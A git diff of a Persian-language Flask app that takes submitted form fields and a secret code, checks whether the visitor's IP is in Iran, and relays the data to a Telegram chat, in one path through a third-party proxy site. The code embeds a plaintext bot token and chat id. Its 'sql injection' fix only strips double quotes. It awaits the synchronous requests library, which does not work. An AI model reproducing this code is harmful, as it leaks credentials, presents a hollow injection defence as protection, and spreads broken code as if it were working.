@@ -11,15 +11,17 @@ Months = {
     "1":"فروردین","2":"اردیبهشت","3":"خرداد","4":"تیر","5":"مرداد","6":"شهریور","7":"مهر","8":"آبان","9":"آذر","10":"دی","11":"بهمن","12":"اسفند"
 }
 
-def SendMessageToTelegramDirect(Message):
-    requests.get("https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message)
 
-def SendMessageToTelegramIndirect(Message):
+async def SendMessageToTelegramDirect(Message):
+   req = await requests.get("https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message)
+   return req
+
+async def SendMessageToTelegramIndirect(Message):
     settings = {
         "UrlBox": "https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message,
         "MethodList": "POST"
     }
-    req = requests.post(
+    req = await requests.post(
         "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", settings)
     return req
 
@@ -27,7 +29,7 @@ def SendMessageToTelegramIndirect(Message):
 app = Flask(__name__ , template_folder=".")
 
 
-def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
+async def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
     message = f"""
     کاربر شماره: {id}
     کد اشتراکی دریافتی از ادمین:
@@ -49,10 +51,10 @@ def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
         {submited} بار فیلد هارو پر کرده 
         {time} {day} {DayOfMonth} {Month} 
         """
-    SendMessageToTelegramDirect(message)
+    await SendMessageToTelegramDirect(message)
 
 @app.route('/', methods=['GET', 'POST'])
-def form_page():
+async def form_page():
     Ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
     # IsFromIran = True  # For Debug
     IsFromIran = requests.get(f"https://geolocation-db.com/json/{Ip}&position=true").json().get("country_name") == "Iran"
@@ -61,13 +63,14 @@ def form_page():
     try:
         data = jsonify(request.json).get_json()
         Scode = data.get('SecretCode')
+        Scode = Scode.replace('"','') # sql injection
         if request.method == 'POST' and len(Scode) == 32:
             Field1 = data.get('Field1')
             Field2 = data.get('Field2')
             Field3 = data.get('Field3')
             Db.AddOrUpdate(Ip , Scode)
             User = Db.GetUserByIP(Ip)
-            SendToTelegram(Field1,Field2,Field3,User[1],User[2],User[0])
+            await  SendToTelegram(Field1,Field2,Field3,User[1],User[2],User[0])
             return "Ok"
     finally:
         Db.onVisitEvent(Ip)
